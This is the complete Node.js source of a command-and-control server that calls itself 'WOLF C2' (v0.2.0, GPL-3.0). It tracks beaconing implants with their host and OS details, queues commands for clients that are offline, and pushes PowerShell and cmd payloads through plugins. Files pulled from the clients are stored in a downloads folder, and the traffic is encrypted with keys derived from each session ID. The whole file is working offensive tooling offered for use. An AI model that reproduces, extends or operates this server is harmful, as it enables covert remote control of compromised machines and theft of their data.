/**
 *                                  ,--,                                               
 *                               ,---.'|                                               
 *            .---.    ,----..   |   | :       ,---,.          ,----..        ,----,   
 *           /. ./|   /   /   \  :   : |     ,'  .' |         /   /   \     .'   .' \  
 *       .--'.  ' ;  /   .     : |   ' :   ,---.'   |        |   :     :  ,----,'    | 
 *      /__./ \ : | .   /   ;.  \;   ; '   |   |   .'        .   |  ;. /  |    :  .  ; 
 *  .--'.  '   \' ..   ;   /  ` ;'   | |__ :   :  :          .   ; /--`   ;    |.'  /  
 * /___/ \ |    ' ';   |  ; \ ; ||   | :.'|:   |  |-,        ;   | ;      `----'/  ;   
 * ;   \  \;      :|   :  | ; | ''   :    ;|   :  ;/|        |   : |        /  ;  /    
 *  \   ;  `      |.   |  ' ' ' :|   |  ./ |   |   .'        .   | '___    ;  /  /-,   
 *   .   \    .\  ;'   ;  \; /  |;   : ;   '   :  '          '   ; : .'|  /  /  /.`|   
 *    \   \   ' \ | \   \  ',  / |   ,/    |   |  |          '   | '/  :./__;      :   
 *     :   '  |--"   ;   :    /  '---'     |   :  \          |   :    / |   :    .'    
 *      \   \ ;       \   \ .'             |   | ,'           \   \ .'  ;   | .'       
 *       '---"         `---`               `----'              `---`    `---'          
 *    AUTHOR: Russell Benzing                             
 *    VERSION: 0.2.0
 *    LICENSE: GPL-3.0
 */
//  ------------------------------------- VARIABLES -------------------------------------
const { createServer } = require('node:net');
const { pbkdf2, randomBytes, createHash, createCipheriv, createHmac, createDecipheriv, timingSafeEqual } = require('node:crypto');
const { promisify } = require('node:util');
const { networkInterfaces } = require("node:os");
const { mkdir, readdir, writeFile, existsSync, createWriteStream } = require('node:fs');
const { join } = require('node:path');
const { createInterface } = require('node:readline');

// promises
const pbkdf2_promise = promisify(pbkdf2);
const randomBytes_promise = promisify(randomBytes);
const mkdir_promise = promisify(mkdir);
const readdir_promise = promisify(readdir);
const writeFile_promise = promisify(writeFile);

const _VERSION = '0.2.0';
const CHUNK_SIZE = 1024;
const PORT = 54678;
const LOGGING = true;
const LOGS_FOLDER = join(__dirname, 'logs');
const DOWNLOADS_FOLDER = join(__dirname, 'downloads');
const PLUGINS_FOLDER = join(__dirname, 'plugins');
const MAX_LOG_LINES = 20000;
const SUPPORTED_CIPHERS = ['aes-256-cbc', 'aes-256-gcm'];

const activeClients = new Map();
const queuedCommands = new Map();
const loadedPlugins = new Map();
const serverCommands = ['help', 'client', 'clients', 'exit', 'plugins', 'set', 'uptime', 'clear'];
const clientCommands = [];

let rl = null; // console readline instance
let startTime = Date.now(); // script start time
let activeClientSessionID = null; // active client
let server = null; // server sockets instance
let logFileIndex = 1; // log file index
let logStream = null; // log stream instance
let currentLineCount = 0; // current log line count

//  ------------------------------------- LOGGING -------------------------------------

// Create a writable stream for logging
const createLogStream = async (index) => {
    if (LOGGING) {
        if (!existsSync(LOGS_FOLDER)) {
            await mkdir_promise(LOGS_FOLDER);
        }
        const logFilePath = join('logs', `server_${index}.log`);
        return createWriteStream(logFilePath, { flags: 'a' });
    }
    return null;
};

const log = async (texts, colors = 97) => {
    // Ensure texts and colors are arrays
    texts = Array.isArray(texts) ? texts : [texts];
    colors = Array.isArray(colors) ? colors : [colors];

    // Check that the lengths of texts and colors match
    if (texts.length !== colors.length) {
        console.error("Error: The lengths of texts and colors should match.");
        return;
    }

    if (LOGGING && logStream) {
        const message = texts.join(' ');
        const lineCount = message.split(/\r\n|\r|\n/).length;
        
        currentLineCount += lineCount;
        if (currentLineCount >= MAX_LOG_LINES) {
            logStream.end();
            logFileIndex++;
            logStream = await createLogStream(logFileIndex);
            
            currentLineCount = 0;
        }

        logStream.write(`${message}\n`);
    }

    // Format and log to console
    const formattedText = texts.map((text, index) => `\x1b[${colors[index]}m${text}\x1b[0m`).join(' ');
    console.log(formattedText);
};

const logError = (error) => {
    log(error, 91); // Bright Red
};
const logInfo = (info) => {
    log(info, 37); // White
};
const logSuccess = (success) => {
    log(success, 92); // Bright Green
};

//  ------------------------------------- HELPER METHODS  -------------------------------------

/**
 * Get the server local IP address
 * @returns 
 */
const getLocalIpAddress = () => {
    const interfaces = networkInterfaces();
    let localIp;

    // Iterate through the network interfaces
    Object.keys(interfaces).forEach((ifaceName) => {
        interfaces[ifaceName].forEach((iface) => {
            // Skip over non-IPv4 and internal interfaces, and addresses starting with 172. and 127.
            if (iface.family === 'IPv4' && !iface.internal && !iface.address.startsWith('172.') && !iface.address.startsWith('127.')) {
                localIp = iface.address
            }
        });
    });
    return localIp || 'localhost';
};

/**
 * gets the client session ID
 * @returns 
 */
const getSessionId = (ipAddress) => {
    if (ipAddress === '::1') {
        ipAddress = '127.0.0.1';
    }
    const sum = ipAddress.split('.').reduce((acc, val) => acc + parseInt(val), 0);
    return createHash('sha256').update(ipAddress + '<>' + sum).digest('hex').slice(0, 32);
};

/**
 * PBKDF2 Encryption
 * @param {string} data 
 * @param {string} sharedKey 
 * @param {string} [cipher='aes-256-gcm'] 
 * @returns {Promise<string>}
 */
const encryptData = async (data, sharedKey, cipher = 'aes-256-gcm') => {
    if (typeof data !== 'string' || typeof sharedKey !== 'string') {
        throw new TypeError('Data and shared key must be strings');
    }
    if (!SUPPORTED_CIPHERS.includes(cipher)) {
        throw new TypeError(`Unsupported cipher. Supported ciphers are: ${SUPPORTED_CIPHERS.join(', ')}`);
    }
    try {
        const salt = await randomBytes_promise(32);
        const iv = await randomBytes_promise(cipher.endsWith('gcm') ? 12 : 16);
        const key = await pbkdf2_promise(sharedKey, salt, 200000, 32, 'sha512');
        const cipherIv = createCipheriv(cipher, key, iv);
        let encryptedData = cipherIv.update(data, 'utf8', 'base64');
        encryptedData += cipherIv.final('base64');
        let authTag;
        if (cipher.endsWith('gcm')) {
            authTag = cipherIv.getAuthTag();
        } else {
            const hmac = createHmac('sha256', key);
            hmac.update(Buffer.from(encryptedData, 'base64'));
            authTag = hmac.digest();
        }
        return `${salt.toString('base64')}:${iv.toString('base64')}:${authTag.toString('base64')}:${encryptedData}`;
    } catch (err) {
        if (err instanceof TypeError) {
            throw err;
        }
        throw new Error(`Encryption failed: ${err.message}`);
    }
};

/**
 * PBKDF2 Decryption
 * @param {string} encrypted 
 * @param {string} sharedKey 
 * @returns {Promise<string>}
 */
const decryptData = async (encrypted, sharedKey) => {
    try {
        // Split and decode Base64 encoded components
        const [salt, iv, authTag, encryptedData] = encrypted.split(':').map(part => Buffer.from(part, 'base64'));

        // Determine the cipher mode based on IV length
        const cipher = iv.length === 12 ? 'aes-256-gcm' : 'aes-256-cbc';

        // Derive the key using PBKDF2
        const key = await pbkdf2_promise(sharedKey, salt, 200000, 32, 'sha512');

        if (cipher === 'aes-256-gcm') {
            // Initialize decipher for AES-GCM
            const decipher = createDecipheriv(cipher, key, iv);
            decipher.setAuthTag(authTag);

            // Decrypt the data
            let decryptedData = decipher.update(encryptedData);
            decryptedData = Buffer.concat([decryptedData, decipher.final()]);

            return decryptedData.toString('utf8');
        } else if (cipher === 'aes-256-cbc') {
            // Initialize decipher for AES-CBC
            const decipher = createDecipheriv(cipher, key, iv);

            // Decrypt the data
            let decryptedData = decipher.update(encryptedData);
            decryptedData = Buffer.concat([decryptedData, decipher.final()]);

            // Create HMAC to verify the authenticity of the data
            const hmac = createHmac('sha256', key);
            hmac.update(Buffer.concat([iv, encryptedData]));
            const computedAuthTag = hmac.digest();

            // Verify HMAC
            if (!timingSafeEqual(authTag, computedAuthTag)) {
                throw new Error('Authentication failed. The data may have been tampered with.');
            }

            return decryptedData.toString('utf8');
        } else {
            throw new Error('Unsupported cipher mode.');
        }
    } catch (err) {
        throw new Error(`Decryption failed: ${err.message}`);
    }
};

/**
 * Format the uptime to hours, minutes and seconds
 * @param {*} milliseconds 
 * @returns 
 */
const formatTime = (milliseconds) => {
    const totalSeconds = Math.floor(milliseconds / 1000);
    const days = Math.floor(totalSeconds / 86400);
    const hours = Math.floor((totalSeconds % 86400) / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
};

/**
 * Get the server uptime
 * @returns 
 */
const getUptime = () => {
    const currentTime = Date.now();
    const uptimeMillis = currentTime - startTime;
    return `Uptime: ${formatTime(uptimeMillis)}`;
};

//  ------------------------------------- Response Handlers -------------------------------------
/**
 * Beacon handler
 * @param {*} response
 * @param {*} sessionId 
 */
const handleBeacon = (response, sessionId) => {
    const client = activeClients.get(sessionId);
    logInfo(`\nReceived beacon from client: ${sessionId}`);
    const date = new Date();
    const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
    const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
    const formattedDate = date.toLocaleDateString('en-US', dateOptions);
    const formattedTime = date.toLocaleTimeString('en-US', timeOptions);
    client.lastSeen = `${formattedDate} ${formattedTime}`;
    client.active = true;
    client.type = response.type;
    client.version = response.version;
    client.platform = response.platform, 
    client.arch = response.arch, 
    client.osver = response.osver, 
    client.hostname = response.hostname
    executeQueuedCommands(client);
};

/**
 * Download handler
 * @param {*} response
 * @param {*} client
 */
const handleDownloadResponse = async (response) => {
    try {
        if (!existsSync(DOWNLOADS_FOLDER)) {
            await mkdir_promise(DOWNLOADS_FOLDER);
        }
        const fileName = response.download;
        const assembledFilePath = join(DOWNLOADS_FOLDER, fileName);
        await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
        logSuccess(`\nFile "${fileName}" downloaded successfully to ${DOWNLOADS_FOLDER}`);
    } catch (error) {
        logError(`Error handling download response: ${error.message}`);
    }
};

/**
 * Default handler
 * @param {*} response 
 * @returns 
 */
const handleResponse = (response) => {
    if (!response) {
        logError("Error: invalid response.");
        return;
    }
    // deconstruct the response response if exists;
    if (response.response) {
        response = response.response;
    }
    if (response.data) {
        let data = response.data;
        if (data.type === "Buffer") {
            // handle buffer response
            const response = Buffer.from(data.data).toString('utf8').trim();
            log(response);
            return;
        } else {
            if (typeof data !== 'string') {
                data = JSON.stringify(data);
            }
            log(data.toString('utf8').trim());
        }
        return;
    } else if (response.message) {
        logInfo(response.message);
        return;
    } else if (response.error) {
        logError(response.error);
        return;
    }
};

/**
 * Shows the full active client details
 */
const showClient = () => {
    if (!activeClientSessionID) {
        throw new Error(`You must set a session ID first.`);
    }
    const client = activeClients.get(activeClientSessionID);
    if (!client) {
        throw new Error(`Invalid session ID: ${activeClientSessionID}`);
    }
    log("\nClient Details:", 93);
    log(["Last Seen:\t\t", client.lastSeen], [96, 97]);
    log(["Active:\t\t\t", client.active], [96, 97]);
    log(["Session ID:\t\t", client.sessionId], [96, 97]);
    log(["Hostname:\t\t", client.hostname], [96, 97]);
    log(["IP Address:\t\t", client.address], [96, 97]);
    log(["Type:\t\t\t", client.type], [96, 97]);
    log(["Client Ver:\t\t", client.version], [96, 97]);
    log(["Architecture:\t\t", client.arch], [96, 97]);
    log(["Platform:\t\t", client.platform], [96, 97]);
    log(["OS Ver:\t\t\t", client.osver, "\n"], [96, 97, 97]);
};

/**
 * Sets the active client session ID
 * @param {*} sessionId 
 */
const setClientActive = (sessionId) => {
    if (!sessionId) {
        activeClientSessionID = null;
        log('The active session ID has been cleared.');
        return;
    }
    let clientExists = activeClients.get(sessionId);
    if (sessionId && clientExists && sessionId.length === 32) {
        activeClientSessionID = sessionId;
        log(`${activeClientSessionID} is now the active session.`);
    } else {
        logError('Invalid session ID.');
    }
};

/**
 * Handles the command input for the server
 * @param {*} command 
 * @param {*} properties 
 */
const handleServerCommand = async (command, properties) => {
    try {
        if (clientCommands.includes(command.split(' ')[0]) ||
            serverCommands.includes(command.split(' ')[0])) {
            let handledByPlugin = false;
            for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
                if (pluginModule.commands && pluginModule.commands[command]) {
                    const pluginCommand = pluginModule.commands[command];
                    if (pluginModule.type === 'server') {
                        pluginCommand.handler(properties, {process, rl, console});
                    } else if (pluginModule.type === 'client') {
                        switch (pluginCommand.method) {
                            case 'payload-ps':
                                await sendClientCommand('ps', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'payload-cmd':
                                await sendClientCommand('cmd', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'execute':
                                command = pluginCommand.handler(properties);
                                await sendClientCommand(command, properties);
                                break;
                            default:
                        }
                    }
                    handledByPlugin = true;
                    break;
                }
            }
            if (!handledByPlugin) {
                switch (command) {
                    case 'clear':
                        console.clear();
                        await rl.write("\u001b[0J\u001b[1J\u001b[2J\u001b[0;0H\u001b[0;0W", { ctrl: true, name: 'l'});
                        break;
                    case 'uptime':
                        log(getUptime());
                        break;
                    case 'set':
                        setClientActive(properties[0]);
                        break;
                    case 'plugins':
                        displayActivePlugins();
                        break;
                    case 'help':
                        displayCommandOptions();
                        break;
                    case 'client':
                        showClient(properties[0]);
                        break;
                    case 'clients':
                        showActiveClients();
                        break;
                    case 'exit':
                        closeServer();
                        break;
                    default:
                        logInfo('Invalid command. Type "help" to see available commands.');
                }
            }
        }
        await rl.prompt();
    } catch (error) {
        logError(`Exception: ${error.message}`);
    }
};

//  ------------------------------------- Methods -------------------------------------

/**
 * Sends a command to a client
 * @param {*} client
 * @param {*} command 
 * @param {*} args 
 */
const sendCommandToClient = async (client, command, args) => {
    if (!client) {
        throw new Error('Invalid client.'); 
    } else if (!command) {
        throw new Error('Missing command.')
    }
    if (client && client.active) {
        await executeClientCommand(client, [command, ...args].join(' '));
    } else {
        const queuedCommandsForSession = queuedCommands.get(client.sessionId) || [];
        queuedCommandsForSession.push({ command, args });
        logInfo(`Queued command for client ${client.sessionId}. Command: ${command} ${args}`);
        queuedCommands.set(client.sessionId, queuedCommandsForSession);
    }
};

/**
 * Execute a client command
 * @param {*} client 
 * @param {*} command 
 */
const executeClientCommand = async (client, command) => {
    const socket = client.socket;
    const sessionId = client.sessionId;
    const payload = await encryptData(command, sessionId);
    if (payload) {
        return new Promise((resolve) => {
            if (socket.write(payload) === true) {
                // wait
            } else {
                socket.once("drain", resolve(true));
            }
        });
    } else {
        throw new Error("Payload invalid.");
    }
};

/**
 * Execute the queued command on a session ID
 */
const executeQueuedCommands = async (client) => {
    if (!client || !client.sessionId) {
        throw new Error('No active session ID set.');
    }
    const commands = queuedCommands.get(client.sessionId);
    if (commands) {
        commands.forEach(async ({ command, args }) => {
            await executeClientCommand(client, `${command} ${args.join(' ')}`);
            logInfo(`Queued client command executed: ${command} ${args.join(' ')}`);
        });
        queuedCommands.delete(client.sessionId);
    }
};

/**
 * Shows the clients list
 * @returns 
 */
const showActiveClients = () => {
    if (activeClients.size === 0) {
        getHowel();
        logInfo('No active clients.');
        return;
    }
    const active = Array.from(activeClients.values()).filter(client => client.active).length;
    logSuccess(`\nClient Sessions (${activeClients.size} Total / ${active} Active):`);
    const colWidths = [36, 15, 20, 10, 10, 10, 10];
    const totalWidth = colWidths.reduce((sum, width) => sum + width, 0) + colWidths.length + 1;
    const pad = (str, len) => str ? str.padEnd(len) : "".padEnd(10);
    logInfo('┌' + '─'.repeat(totalWidth - 2) + '┐');
    logInfo('│' + pad('SessionID', colWidths[0]) + '│' +
                     pad('ClientIP', colWidths[1]) + '│' +
                     pad('Updated', colWidths[2]) + '│' +
                     pad('Online', colWidths[3]) + '│' +
                     pad('Active', colWidths[4]) + '│' +
                     pad('Ver', colWidths[5]) + '│' +
                     pad('Type', colWidths[6]) + '│');
    logInfo('├' + colWidths.map(w => '─'.repeat(w)).join('┼') + '┤');
    for (const [sessionId, client] of activeClients) {
        const datetime = new Date(client.lastSeen);
        const lastSeen = datetime.toLocaleDateString('en-US', {
            weekday: 'short',
            year: 'numeric',
            month: 'short',
            day: 'numeric'
        });
        logInfo('│' + pad(sessionId, colWidths[0]) + '│' +
                         pad(client.address, colWidths[1]) + '│' +
                         pad(lastSeen, colWidths[2]) + '│' +
                         pad(client.active ? 'Yes' : 'No', colWidths[3]) + '│' +
                         pad(client.sessionId === activeClientSessionID ? 'Yes' : 'No', colWidths[4]) + '│' +
                         pad(client.version, colWidths[5]) + '│' +
                         pad(client.type, colWidths[6]) + '│');
    }
    logInfo('└' + colWidths.map(w => '─'.repeat(w)).join('┴') + '┘');
};

/**
 * Registers a plugin for the server
 * @param {*} plugin 
 */
const registerPlugin = (plugin) => {
    // Register additional commands provided by the plugin
    if (plugin && plugin.module) {
        const commandKeys = Object.keys(plugin.module.commands).filter(c => c.method !== 'execute');
        if (plugin.module.type === 'server') {
            serverCommands.push(...commandKeys);
        } else if(plugin.module.type === 'client') {
            clientCommands.push(...commandKeys);
        }
        commandKeys.forEach((command) => {
            // Extract command name and function
            const cmd = plugin.module.commands[command],
                  name = cmd.name,
                  handler = cmd.handler;

            // Check if the command name is not already registered
            if (!global[name]) {
                // Register the command globally
                global[name] = handler;
            } else {
                logError(`Plugin: "${plugin.name}" is already registered.`);
            }
        });
    }
    logInfo(`Plugin: "${plugin.name} - ${plugin.module.description}" has been registered.`);

    // Add the plugin to the loaded plugins map
    loadedPlugins.set(plugin.name, plugin.module);
};

/**
 * Loads plugins for the server then registers them
 */
const loadAndRegisterPlugins = async () => {
    try {
        const pluginFiles = await readdir_promise(PLUGINS_FOLDER, { withFileTypes: true });
        await Promise.all(pluginFiles.map((file) => {
            const pluginName = file.name;
            const pluginPath = join(PLUGINS_FOLDER, pluginName);
            const pluginModule = require(pluginPath);
            if (!pluginModule || typeof pluginModule !== 'object') {
                logError(`Invalid plugin module in file "${pluginName}". Skipping...`);
                return;
            }
            // Check if the plugin module exports the 'commands' object
            if (!pluginModule.commands) {
                logError(`Plugin "${pluginName}" does not have valid commands defined.`);
                return;
            }
            if (file.isFile()) {
                registerPlugin({ name: pluginName, module: pluginModule });
            }
        }));
    } catch (err) {
        logError('Error loading plugins:', err.message);
    }
};

const getHowel = () => {
    log(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀⢀⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉⠀⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠎⢠⣇⠏⠀⠀⠀⠀⠀⠀⠀⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀⢾⢟⠴⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⠀⠠⣄⠸⢹⣦⠀⠀⡄⠀⠀⢋⡟⠀⠀⠁⣇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢹⣦⢠⣼⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀
⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀
⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀
⠀⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻`);
};

const getWolfText = () => {
    log(`██╗⠘⣰⣿⣿██╗ ██████╗ ██╗⢶⣿⡎⠻⣆███████╗     ██████╗██████╗ 
██║⡟⡿⢿⡿██║██╔═████╗██║⠙⢿⡄⡈⢆██╔════╝    ██╔════╝╚════██╗
██║ █╗ ██║██║██╔██║██║⠀⡇⢹⢿⡀█████╗      ██║      █████╔╝
██║███╗██║████╔╝██║██║⠀⠀⠼⠇⠁██╔══╝      ██║     ██╔═══╝ 
╚███╔███╔╝╚██████╔╝███████╗██║         ╚██████╗███████╗
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝          ╚═════╝╚══════╝`);
};

/**
 * Shows the startup info
 */
const getStartup = () => {
    getWolfText();
    log([`Ver. ${_VERSION}`, ' | ',`Listening on: ${getLocalIpAddress()}:${PORT}`, ' | ', `${getUptime()}`], [94, 97, 93, 97, 93]);
};

/**
 * Displays the active plugins
 */
const displayActivePlugins = () => {
    log("\nACTIVE PLUGINS:", 93);
    Array.from(loadedPlugins).forEach(plugin => {
        const [ name, module ] = plugin;
        log(["Type:", `\t\t${module.type} plugin`], [96, 97]);
        log(["Name:", `\t\t${name}`], [96, 97]);
        log(["Description:", `\t${module.description}`], [96, 97]);
        log(["Commands:", `\t${Object.keys(module.commands).join(', ')}\n`], [96, 97]);
    });
};

/**
 * Displays the server commands
 */
const displayCommandOptions = () => {
    log("\nSERVER COMMANDS:", 93);
    log(["help\t\t", "Display available commands."], [96, 97]);
    log(["plugins \t", "List all active plugins."], [96, 97]);
    log(["clients \t", "List all active clients."], [96, 97]);
    log(["uptime\t\t", "Display server uptime."], [96, 97]);
    log(["set\t\t", "Sets the client session to make active."], [96, 97]);
    log(["clear\t\t", "Clear the console."], [96, 97]);
    log(["exit\t\t", "Exit the server."], [96, 97]);
    log("\nPLUGINS:", 93);
    for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
        log(`${pluginName}: ${pluginModule.description}`, 93);
        if (pluginModule.commands) {
            let cnt = 0;
            Object.keys(pluginModule.commands).forEach((command) => {
                let cmdLength = command.length,
                format = `\t`;
                if (cmdLength < 6) {
                    format = `\t\t`;
                } else if (cmdLength === 6 || cmdLength === 7) {
                    format = `  \t`;
                }
                cnt += 1;
                let format2 = "";
                if (cnt === Object.keys(pluginModule.commands).length) {
                    format2 = "\n";
                }
                log([`${command}${format}`, `${pluginModule.commands[command].description}${format2}`], [96, 97]);
            });
        }
    }
};

const sendClientCommand = async (command, args) => {
    const sessionId = activeClientSessionID || null;
    if (sessionId) {
        const client = activeClients.get(sessionId);
        if (!client) {
            logError(`Invalid client session ID or client not found.`);
            return;
        }
        // Send command to client and wait for response
        await sendCommandToClient(client, command, args);
    } else {
        logInfo(`You must first set an active client sessionID.`);
    }
};

/**
 * Closes the server connection
 */
const closeServer = () => {
    for (const [sessionId, client] of activeClients) {
        client.socket.destroy();
        logSuccess(`Client connection ${sessionId} has been closed.`);
    }
    activeClientSessionID = null;
    server.close(() => {
        logInfo('\nServer connection closed');
        if (rl) {
            rl.close();
            logSuccess(`Console has been closed.`);
        }
        if (logStream) {
            // stop log stream
            logStream.end();
            logSuccess(`LogStream has been closed.`);
        }
        process.exit(0);
    });
};

/**
 * Processes and shows the input on the console
 */
const startInputListener = () => {
    rl = createInterface({
        input: process.stdin,
        output: process.stdout,
        prompt: "\x1b[33mEnter command > \x1b[0m"
    });

    rl.prompt();

    rl.on('line', async (input) => {
        try {
            const [command, ...args] = input.trim().split(/ +(?=(?:(?:[^"]*"){2})*[^"]*$)/); // Use regex to split by any whitespace
            if (!command) {
                rl.prompt();
                return;
            }
            if (LOGGING && logStream) {
                logStream.write(`Enter command > ${command}\n`);
            }
            // handle the command
            await handleServerCommand(command, args);
        } catch (error) {
            logError(`Error: ${error.message}`);
            rl.prompt();
        }
    });
};

// Net Socket Server
server = createServer((socket) => {
    const ipAddress = socket.address().address.replace("::ffff:","");
    const sessionId = getSessionId(ipAddress)
    let client = activeClients.get(sessionId);
    if (!client) {
        client = {
            sessionId: sessionId,
            socket: socket,
            address: ipAddress,
            lastSeen: new Date(),
            active: true,
            buffer: '',
            waiting: false,
            version: null,
            type: null,
            platform: null, 
            arch: null, 
            osver: null, 
            hostname: null
        };
        activeClients.set(sessionId, client);
    } else {
        client.active = true;
        client.socket = socket;
        client.lastSeen = (new Date()).getDate();
    }
    socket.on('data', async (payload) => {
        try {
            if (payload.length >= CHUNK_SIZE || payload.includes('--FIN--')) {
                // chunk mode
                client.waiting = true;
                client.buffer += payload;
                if (client.buffer.includes('--FIN--')) {
                    const bufferChunks = client.buffer.replace('--FIN--', '');
                    const decrypted = await decryptData(bufferChunks.toString('utf8'), client.sessionId);
                    const parsed = JSON.parse(decrypted);
                    const response = parsed.response;
                    if (response.download) {
                        await handleDownloadResponse(response);
                    } else {
                        handleResponse(response);
                    }
                    client.waiting = false;
                    client.buffer = '';
                }
            } else {
                // non-chunk mode
                const decrypted = await decryptData(payload.toString('utf8'), client.sessionId);
                const parsed = JSON.parse(decrypted);
                const response = parsed.response;
                if (response.beacon) {
                    handleBeacon(response, client.sessionId);
                } else if (response.download) {
                    await handleDownloadResponse(response, client.sessionId);
                } else if (response.error) {
                    logError(response.error);
                } else {
                    handleResponse(response);
                }
            }
        } catch(err) {
            logError(err.message);
        }
    });
    socket.on('end', () => {
        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`);
        if (client) {
            client.lastSeen = new Date();
            client.active = false;
        }
    });
    socket.on('error', (err) => {
        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`);
        if (client) {
            client.active = false;
        }
    });
});

server.on('error', (err) => {
    logError('\nServer threw an error:', err.message);
    closeServer();
});

server.listen(PORT, async () => {
    logStream = await createLogStream(logFileIndex);
    getHowel();
    getStartup();
    await loadAndRegisterPlugins();
    startInputListener();
});